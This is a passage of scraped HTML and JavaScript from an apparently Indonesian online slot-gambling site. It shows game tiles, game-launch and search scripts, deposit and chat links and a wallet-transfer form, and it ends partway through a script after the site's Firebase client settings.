                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/8457276b4d4bff87f190c0df6533fb49.webp?v=0.1" src="/assets/games/i/165x220/8457276b4d4bff87f190c0df6533fb49.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Extra Juicy Megaways™">Extra Juicy Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Depths™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Depths™', '/assets/games/i/165x220/7a27921ffe06ebe23d6446b6822e30b4.webp?v=0.1' , 'vs40wanderw', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7a27921ffe06ebe23d6446b6822e30b4.webp?v=0.1" src="/assets/games/i/165x220/7a27921ffe06ebe23d6446b6822e30b4.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Depths™">Wild Depths™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Magician&amp;quot;amp;s Secrets™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Magician&amp;quot;amp;s Secrets™', '/assets/games/i/165x220/c58202b1c24a198f28a72ecbf5a5c96e.webp?v=0.1' , 'vs4096magician', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c58202b1c24a198f28a72ecbf5a5c96e.webp?v=0.1" src="/assets/games/i/165x220/c58202b1c24a198f28a72ecbf5a5c96e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Magician's Secrets™">Magician's Secrets™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Elemental Gems Megaways™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Elemental Gems Megaways™', '/assets/games/i/165x220/ede842f018f407d843f734903d27693d.webp?v=0.1' , 'vswayselements', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ede842f018f407d843f734903d27693d.webp?v=0.1" src="/assets/games/i/165x220/ede842f018f407d843f734903d27693d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Elemental Gems Megaways™">Elemental Gems Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Might of Ra" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Might of Ra', '/assets/games/i/165x220/01800512a24d6bc44666542c08f2b955.webp?v=0.1' , 'vs50mightra', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/01800512a24d6bc44666542c08f2b955.webp?v=0.1" src="/assets/games/i/165x220/01800512a24d6bc44666542c08f2b955.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Might of Ra">Might of Ra</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Book of Aztec King" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Book of Aztec King', '/assets/games/i/165x220/b7ed82dd7a292f7c5b32e33b3a065a2e.webp?v=0.1' , 'vs10bookazteck', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b7ed82dd7a292f7c5b32e33b3a065a2e.webp?v=0.1" src="/assets/games/i/165x220/b7ed82dd7a292f7c5b32e33b3a065a2e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Book of Aztec King">Book of Aztec King</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Snakes and Ladders Megadice" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Snakes and Ladders Megadice', '/assets/games/i/165x220/7c4e0dbf30db584d490b06c4d93d3808.webp?v=0.1' , 'vs10snakeladd', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7c4e0dbf30db584d490b06c4d93d3808.webp?v=0.1" src="/assets/games/i/165x220/7c4e0dbf30db584d490b06c4d93d3808.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Snakes and Ladders Megadice">Snakes and Ladders Megadice</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cash Patrol™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cash Patrol™', '/assets/games/i/165x220/74e9f36f170af7a21a0d498017c24864.webp?v=0.1' , 'vs25copsrobbers', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/74e9f36f170af7a21a0d498017c24864.webp?v=0.1" src="/assets/games/i/165x220/74e9f36f170af7a21a0d498017c24864.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cash Patrol™">Cash Patrol™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Ultimate 5™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Ultimate 5™', '/assets/games/i/165x220/90d2377fca03a4457d4d29b8eec23188.webp?v=0.1' , 'vs20ultim5', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/90d2377fca03a4457d4d29b8eec23188.webp?v=0.1" src="/assets/games/i/165x220/90d2377fca03a4457d4d29b8eec23188.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Ultimate 5™">The Ultimate 5™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rock Vegas™" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rock Vegas™', '/assets/games/i/165x220/e1b566c10f1122e7f714cde6a26837cb.webp?v=0.1' , 'vs20rockvegas', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e1b566c10f1122e7f714cde6a26837cb.webp?v=0.1" src="/assets/games/i/165x220/e1b566c10f1122e7f714cde6a26837cb.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rock Vegas™">Rock Vegas™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gold Party™" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gold Party™', '/assets/games/i/165x220/406950fa9889d968e0442dc4de4751e4.webp?v=0.1' , 'vs25goldparty', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/406950fa9889d968e0442dc4de4751e4.webp?v=0.1" src="/assets/games/i/165x220/406950fa9889d968e0442dc4de4751e4.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gold Party™">Gold Party™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Tic Tac Take" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Tic Tac Take', '/assets/games/i/165x220/19059e69111389f8a901c684bb1d14cf.webp?v=0.1' , 'vs10tictac', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/19059e69111389f8a901c684bb1d14cf.webp?v=0.1" src="/assets/games/i/165x220/19059e69111389f8a901c684bb1d14cf.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Tic Tac Take">Tic Tac Take</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Rainbow Gold" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Rainbow Gold', '/assets/games/i/165x220/ecc23a412d9b20faa96b24f6b41c4d22.webp?v=0.1' , 'vs20rainbowg', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ecc23a412d9b20faa96b24f6b41c4d22.webp?v=0.1" src="/assets/games/i/165x220/ecc23a412d9b20faa96b24f6b41c4d22.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Rainbow Gold">Rainbow Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bull Fiesta" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bull Fiesta', '/assets/games/i/165x220/2a98b9127be821a790d4eb640daac244.webp?v=0.1' , 'vs25bullfiesta', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2a98b9127be821a790d4eb640daac244.webp?v=0.1" src="/assets/games/i/165x220/2a98b9127be821a790d4eb640daac244.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bull Fiesta">Bull Fiesta</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Disco Lady" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Disco Lady', '/assets/games/i/165x220/81373eb08590036142dce72f61e8d295.webp?v=0.1' , 'vs243discolady', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/81373eb08590036142dce72f61e8d295.webp?v=0.1" src="/assets/games/i/165x220/81373eb08590036142dce72f61e8d295.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Disco Lady">Disco Lady</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Beach Party" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Beach Party', '/assets/games/i/165x220/fbe906917f54556f00492f597365f846.webp?v=0.1' , 'vs20bchprty', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/fbe906917f54556f00492f597365f846.webp?v=0.1" src="/assets/games/i/165x220/fbe906917f54556f00492f597365f846.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Beach Party">Wild Beach Party</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gates of Valhalla™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gates of Valhalla™', '/assets/games/i/165x220/312de300004081745196e270146b4eb0.webp?v=0.1' , 'vs10runes', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/312de300004081745196e270146b4eb0.webp?v=0.1" src="/assets/games/i/165x220/312de300004081745196e270146b4eb0.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gates of Valhalla™">Gates of Valhalla™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Queenie" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Queenie', '/assets/games/i/165x220/0518fc6ee01a20ecd67100d622333829.webp?v=0.1' , 'vs243queenie', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0518fc6ee01a20ecd67100d622333829.webp?v=0.1" src="/assets/games/i/165x220/0518fc6ee01a20ecd67100d622333829.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Queenie">Queenie</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Barn Festival" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Barn Festival', '/assets/games/i/165x220/30e3429bd5be99f5245eeac3f2b43841.webp?v=0.1' , 'vs20farmfest', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/30e3429bd5be99f5245eeac3f2b43841.webp?v=0.1" src="/assets/games/i/165x220/30e3429bd5be99f5245eeac3f2b43841.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Barn Festival">Barn Festival</h5>
        </a>
        
     
  </div>

</div>

<div class="nifty-modal slide-in-bottom" id="gamelinksModal-1">
	<div class="md-content">
		<div class="md-body">
			<div class="row mb-4 no-gutters">
				<div class="col-xs-5">
					<img src="/assets/games/i/165x220/cf5a5c53b1fcf48ad568e333d55c6311.webp?v=0.1" class="img-fluid">
				</div>
				<div class="col-xs-7">
					<div class="g-title">Big Bass Boxing Bonus Round</div>
				</div>
				<input type="hidden" value="vs10bbbbrnd" name="hiddenGameCode001" id="hiddenGameCode001">
				<input type="hidden" value="" name="hiddenSubGameCode001" id="hiddenSubGameCode001">

			</div>

			<div class="row  pt-2">
				<div class="col-xs-5">
										<button class="btn btn-block btn-secondary" onclick="subGameLaunch(event, 1)" i18n="@TryNow">
						DEMO
					</button>
									</div>
				<div class="col-xs-7   ">
					<button class="btn  btn-block btn-primary" onclick="subGameLaunch(event,0)" i18n="@PlayNow">
						MAIN SEKARANG					</button>
				</div>
			</div>
		</div>
	</div>
</div>
<div class="md-overlay"></div>
<script src="/assets/js/fancybox/sweetalert2@11.js"></script>
<script>
function subGameLaunch(e, isDemo) {
    // Ambil nilai dari input tersembunyi
    var provider = $('#hiddenGameID-001').val();
    var gameCode = $('#hiddenGameCode001').val();

    // Debugging: Cek di console browser (F12) apakah nilainya terbaca
    console.log("Provider:", provider);
    console.log("Game Code:", gameCode);

    if (!gameCode || gameCode === "") {
        alert("Gagal: ID Game tidak ditemukan di sistem!");
        return;
    }

    var gameData = {
    provider: $('#hiddenGameID-001').val(),
    gameCode: $('#hiddenGameCode001').val(),
    subCode: $('#hiddenSubGameCode001').val(),
    isDemo: 1  // Paksa ke mode demo
    };

    fetch('launch-game.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        credentials: 'include',
        body: JSON.stringify(gameData)
    })
    // ... sisa kode fetch tetap sama

    .then(function(response) {
      if (!response.ok) throw new Error('Server tidak merespons dengan benar');
      return response.json();
    })
    .then(function(data) {
      if (data.success && data.launchUrl) {
        window.location.href = data.launchUrl;
      } else {
        // Tampilkan pesan error spesifik dari server (jika ada)
        console.error("Gagal meluncurkan game:", data);
        alert(data.message || "Gagal memuat game. Silakan coba lagi.");
      }
    })
    .catch(function(error) {
      console.error("Error Sistem:", error);
      alert("Koneksi ke server game terputus.");
    });
  }
</script>
<div class="nifty-modal slide-in-bottom " id="filterModal-2">
			<div class="md-content">
				<div class="md-body">
                          <div>
                            <p id="" i18n="">Select a filter : 
                                                                                    </p><p>
                             <label class="radio">
                                 <input class="with-gap" name="rdFilterSubGames" type="radio" value="HYPERPLAY">
                                 <span class="filter-title">
                                        HYPERPLAY
                                 </span>
                            </label>
                            </p>
                                                        <p>
                             <label class="radio">
                                 <input class="with-gap" name="rdFilterSubGames" type="radio" value="BUY BONUS FEATURE">
                                 <span class="filter-title">
                                        BUY BONUS FEATURE
                                 </span>
                            </label>
                            </p>
                                                        <p>
                             <label class="radio">
                                 <input class="with-gap" name="rdFilterSubGames" type="radio" value="REEL KINGDOM">
                                 <span class="filter-title">
                                        REEL KINGDOM
                                 </span>
                            </label>
                            </p>
                                                        <p>
                             <label class="radio">
                                 <input class="with-gap" name="rdFilterSubGames" type="radio" value="CLASSIC">
                                 <span class="filter-title">
                                        CLASSIC
                                 </span>
                            </label>
                            </p>
                                                    </div>
                        <div>
                            <button class="btn btn-primary" id="btnApplyFilter_01">APPLY</button>
                        </div>
  				</div>
			</div>
</div>
<div class="md-overlay"></div>

<div class="nifty-modal slide-in-bottom " id="searchModal">
			<div class="md-content">
				<div class="md-body">
                          <div>
                            	<div class="search_filter">
											            <span class="srch_icon md-close"><i class="icon-keyboard_arrow_left"></i></span>
											            <input type="text" matinput="" placeholder="Search" [(ngmodel)]="filterInput" maxlength="255" class="search" (change)="search($event)" i18n-placeholder="@Search">
											            <button matsuffix="" class="btn srch_button" (click)="clearSearch($event)"><i class="icon-x-square"></i></button>
											        </div>
                        </div>

  				</div>
			</div>
</div>
<div class="md-overlay"></div>
<script>
// 1. FUNGSI UNTUK MEMBUKA GAME
function showGameLinks(e, name, imgSrc, gameCode, subCode) {
    // Cegah reload halaman
    if (e) e.preventDefault();
    {
        // Untuk game lain, munculkan modal konfirmasi standar
        $('#gamelinksModal-1 .g-title').text(name);
        $('#gamelinksModal-1 img').attr('src', imgSrc);
        $('#hiddenGameCode001').val(gameCode);
        $('#hiddenSubGameCode001').val(subCode);
        $('#gamelinksModal-1').nifty("show");
    }
} // <--- TUTUP KURUNG HARUS DI SINI BIAR GAK MACET

// 2. FUNGSI PENCARIAN & FILTER (JALAN OTOMATIS SAAT HALAMAN DIBUKA)
$(document).ready(function () {
    var hotGame = '';

    if (hotGame) {
        $('.game-box').each(function () {
            var isMatch = hotGame == $(this).data('title');
            if (isMatch) {
                $(this).trigger('click');
                return false;
            }
        });
    }

    /* Logic Search */
    $('.search').keyup(function () {
        var value = $(this).val().toLowerCase();
        var exp = new RegExp(value);
        $('.game-box').each(function () {
            var title = $(this).find('h5').data('title') || $(this).data('title') || "";
            var isMatch = exp.test(title.toString().toLowerCase());
            $(this).toggle(isMatch);
        });
    });

    $('.srch_button').click(function () {
        $('.search').val("");
        $('.search').trigger("keyup");
    });

    /* Logic Filter Category */
    $('.sub-games .filter .top').addClass('active');

    function filterGameBoxes(self) {
        $('.sub-games .filter .btn').removeClass('active');
        $(self).addClass('active');
        var filterType = $(self).data('filter');

        $('.sub-games .game-box').hide();
        $('.sub-games .game-box').filter(function () {
            return $(this).data("filter").indexOf(filterType) >= 0;
        }).show();
    }

    // Set Default ke ALL
    var defaultFilter = $('.sub-games .filter .btn[data-filter=ALL]')[0];
    if (defaultFilter) filterGameBoxes(defaultFilter);

    $('.sub-games .filter .btn.f').click(function () {
        filterGameBoxes(this);
    });

    $('#btnApplyFilter_01').click(function () {
        var selFilter = $('input[name="rdFilterSubGames"]:checked').val();
        var e = $('#btnFilters_003')[0];
        $(e).data('filter', selFilter);
        filterGameBoxes(e);
        $('#filterModal-2').nifty('hide');
    });

    /* Logic Jackpot Ticker (Hanya jalan jika ada ID JP) */
    var joinedJpIds = ""; // Isi jika ada
    if (joinedJpIds) {
        // ... (Kode Ajax Jackpot Bos tetap sama di sini) ...
    }
});
</script>

                    <div class="mobilesite-footer">  
          <div class="container">
              <style media="screen">
.left-custom-livechat-code{
  bottom: 58px !important;
}
#chat-widget-container{
  bottom: 51px !important;
}
</style>
<div class="menu-bottom">
    <nav class="navbar-inverse navbar-fixed-bottom">
        <div class=" ">
                        <div class="flex-row  text-center">
                <div class="  footericon-single">
                    <a href="https://www.Goblin88.site/home.php?i=1#"><i class="icon-home"></i><div>HOME</div></a>
                </div>
                

                                
                                  <div class="  footericon-single">
                    <a href="https://www.Goblin88.site/promosaya.php"><i class="icon-gift"></i> <div style="text-transform:uppercase;">Promo saya</div></a>
                  </div>
                
                <div class=" footericon-single">
                    <a href="javascript:void(0);" class="text-uppercase togglemenu-trigger footer-funds" data-showid="#fundshover_menu"><i class="icon-transfer"></i> <div>Dana</div></a>
                    <ul class="list-inline horizontal-hover togglemenu-content" id="fundshover_menu">
                      <li>
                        <a href="https://www.Goblin88.site/deposit.php" (click)="closeNav($event);">
                            <div class="fs-sm mt-1" i18n="">Deposit</div>
                        </a>
                      </li>
                      <li>
                        <a href="https://www.Goblin88.site/withdraw.php" (click)="closeNav($event);">
                          <div class="fs-sm mt-1" i18n="">Withdraw</div>
                        </a>
                      </li>
                      <li>
                        <a href="https://www.Goblin88.site/history.php" (click)="closeNav($event);">
                          <div class="fs-sm mt-1" i18n="@History">Pernyataan &nbsp;</div>
                        </a>
                      </li>
                    </ul>
                </div>
                                                <div class=" footericon-single">
                    <a href="https://www.Goblin88.site/memo.php" style="position:relative;"><i class="icon-mail_outline"></i> <div>MEMO</div>
                      
                            <div class="mail_icon" style="">26</div>
                        
                    </a>
                </div>
                
<div class=" footericon-single" style="position: relative">
    <a href="javascript:void(0)" class="text-uppercase togglemenu-trigger" data-showid="#livechathover_menu"><i class="icon-chat1"></i><div>LIVE CHAT</div></a>
    <ul class="list-inline vertical-hover togglemenu-content text-center" id="livechathover_menu">
        <li>
            <!-- 👇 Link statis diganti pakai variabel PHP $linkLiveChat, dan script JS dihapus -->
            <a href="javascript:void(0)" id="livechat-btn" onclick="openLiveChat('https://direct.lc.chat/19926541/' , '')">
                <i class="icon-chat1"></i>
            </a>
        </li>
                                                              
        <li>
            <a href="https://api.whatsapp.com/send?phone=081318111340" target="_blank "><i class="icon-whatsapp"></i></a>
        </li>                          
                                                   
        <li>
            <a href="https://telegram.me/BABYBOSSQOFFICIAL" target="_blank "><i class="icon-telegram"></i></a>
        </li>
    </ul>
</div>
            </div>
        </div>
    </nav>
</div>



<script type="text/javascript">
    $(".togglemenu-trigger").click(function(){
      var currentToggle = $(this).attr("data-showID");
      if($(currentToggle).hasClass("show")){
        $(currentToggle).removeClass("show");
      }
      else{
        $(".togglemenu-content").removeClass("show");
        $(currentToggle).addClass("show");
      }

    });
</script>
            </div>
            </div>
                  </div>
      </div>
      <div id="r-side-bar"> 
    <div class="side-bar-content container"> 
            </div> 
</div> 
 



    </div>
  </div>


  <!--loading modal -->
  <div class="nifty-modal fade-in-scale" id="loading--layout" style="z-index:1000001;" data-isnotcloseoverlay="true">
    <div class="md-content">
      <div class="md-body">

        <div class="loader-b large"></div>
      </div>
    </div>
  </div>
  <div class="md-overlay" style="z-index:1000000;"></div>
  <!--END loading modal -->

  <!-- APK download ||Transfer Wallet  modal start-->
  <div class="nifty-modal slide-in-bottom downloadapk-modal" id="apk-modal">
  			<div class="md-content">
          <div class="modal-header">
       <button class="pull-right md-close"><i class="icon-x fs-lg"></i></button>
      <h3 id="downloadgame-title"></h3>
    </div>
  				<div class="md-body">
           <!--region Transfer Wallet Menu -->
            <div class="row no-gutters" id="trans_to_game_menu__game-modal">
                <form action="" method="post" id="tw_transfer_form" class="tw_transfer_form" novalidate="novalidate">
                  <input type="hidden" name="_token" value="6mpScfAoG0WWOBdqpvKSa5nHR7C4udBoqhKvvRL6">                    <div class="form-group">
                        <label for="mainwallet_amount">From Main Wallet</label>
                        <input type="text" class="form-control" readonly="" name="mainwallet_amount" id="mainwallet_amount" value="188.67">

                    </div>
                    <div class="text-center">
                      <span class="vertical"><i class="icon-arrow-long-right"></i></span>
                    </div>
                    <div class="row">
                      <div class="col-xs-12">
                        <label for="mainwallet_amount">Transfer to <span id="gamename"></span> Wallet</label>
                        <div class="form-group">

                          <div class="customrange-slider">
                            <div id="slider" overflow-scroll="false" class="ui-slider ui-corner-all ui-slider-horizontal ui-widget ui-widget-content">
                              <span tabindex="0" class="ui-slider-handle ui-corner-all ui-state-default" style="left: 0%;"></span>
                              <div class="ui-slider-range ui-corner-all ui-widget-header ui-slider-range-min" style="width: 0%;"></div>
                            </div>
                            <div class="decrease-btn cusbtn">
                              <div id="tw_decrease_btn"> <span class="minus-icon custom-icon">-</span> </div>

                              <div class="minmax-label">Min</div>
                              <div class="minmax-value">
                              5000
                              </div>
                              <input type="hidden" name="twminval" id="twminval" value="5000">
                            </div>
                            <div class="increase-btn cusbtn">
                              <div id="tw_increase_btn">
                                <span class="plus-icon custom-icon">+</span>
                              </div>

                              <div class="minmax-label">Max</div>
                              <div class="minmax-value" id="maxSliderApk">188.67</div>
                            </div>
                          </div>
                        </div>
                          <div class="col-md-8 col-md-offset-2 col-sm-8 col-sm-offset-2 col-xs-8 col-xs-offset-2">
                        <div class="form-group">
                            <input type="text" readonly="" class="form-control" name="transfer_amount" id="transfer_amount" placeholder="0.00" value="00.00" required="">
                        </div>
                        </div>
                      </div>
                    </div>
                    <div class="text-center">
                        <input type="submit" class="btn btn-primary" value="SUBMIT">
                    </div>
                </form>
            </div>
          <!--endregion Transfer Wallet Menu -->

  					<div class="row no-gutters">
  							<div class="col-xs-12 text-center">
  								<a href="#" id="launchurl" class="url-link" target="_blank">
                	<img class="img-fluid" src="/assets/images/log_html5.png" alt="play-in-browser">
  								<div class="download-caption text-center">
  										Play now in your browser
  								</div>
  								<div class="download-linkbtn text-center">
  									<img class="img-fluid" src="/assets/images/btn_playnow.png" alt="play-now-in-browser">
  								</div>
  							</a>
  							</div>
  						</div>
    				</div>
  			</div>
  </div>
  <div class="modal-wrapper nifty-modal fade-in-scale" id="live-draw-modal" data-isnotcloseoverlay="true">
    <div class="md-content"> 
      <div class="md-body"> 
        <div class="modal-header">
        <h4 class="modal-title">Live Draw</h4>      
        <button class="btn btn-link pull-left " id="btn-close--live-draw-modal"> <i class="icon icon-close"></i> </button>
</div>

<div class="modal-body">
    <div id="live_draw_table">
   
    </div>
    <div id="img_details">
        <img src="" class="draw_img" id="draw_img">
        <div class="details">

            <p class="tickte_id">undian berikutnya: <span id="ticket_id"></span></p>
        </div>

        <div class="close_btn_section">
            <button class="btn btn-close" id="img--section-closebtn" onclick="closeImageSection()">Kembali</button>
        </div>
    </div>
    
</div>
      </div>
    </div>
  </div>
  <div class="md-overlay"></div>
  <!-- APK download modal end-->


  <!--<script src="/js/sweetalert.js"></script>  -->


  <script type="text/javascript">

    $(document).ready(function(){
        $( "#mainContentContainer" ).click(function() {
          $( "#sideNav" ).removeClass( "navContentOpen" );
          $( "#sideNav" ).removeClass( "open" );
          $( "#mainContent" ).removeClass( "navContentOpen" );
          $( "#mainContent" ).removeClass( "sideNavOpen" );
          $( "#mainContent" ).removeClass( "rightSideBarOpen" );
          $( "#r-side-bar" ).removeClass( "open" );
        });

        //this is mobile version of btn close login modal
         $(document).on('click', '#btn-close--login-modal',function(event){
              event.preventDefault();
              event.stopPropagation();
              $('#r-side-bar').removeClass('open');
              $( "#mainContent" ).removeClass( "rightSideBarOpen" );
              return false;

        });

        $(document).on('click','.btn-collapse-balances', function(){
          if( !$('#other-game-bals').is(':visible')){
            $('#other-game-bals').slideDown();
            window.getAllGameBal();
          }
          else{
            $('#other-game-bals').slideUp();
          }
          return false;
        });
      });

  </script>

  <script>
    

    
   
    window.loadOrRefreshTurnstileWidget= function(  selectorId ){

         //do nothing;
    }
     
</script>
    <script type="text/javascript" src="/assets/js/jquery-validation/jquery.validate.min.js"></script>
    <script type="text/javascript" src="/assets/js/jquery-validation/additional-methods.min.js"></script>
    <link rel="stylesheet" href="/assets/js/fancybox/jquery.fancybox.min.css">


    <script type="text/javascript" src="/assets/js/fancybox/jquery.fancybox.min.js"></script>
<script>
 
        window.isAuth=  true  ? true : false;
        window.onLogOut = async function(){
            if(window.iFirebase){
                await window.iFirebase.logout();
            }
            
            window.location.href="https://www.Goblin88.site/logout.php";

        }
        window.fbs =  {"apiKey":"AIzaSyA6hCmsU1Tx-_rB9st6TiXLT_M3D-qQ9aw","authDomain":"api-kixplay-live1.firebaseapp.com","projectId":"api-kixplay-live1","storageBucket":"api-kixplay-live1.firebasestorage.app","messagingSenderId":"892534263551","appId":"1:892534263551:web:8c9f262c8a457b082146ca","measurementId":null} ;
        window.firebasSuccessCb = function (params){
        window.json_post(
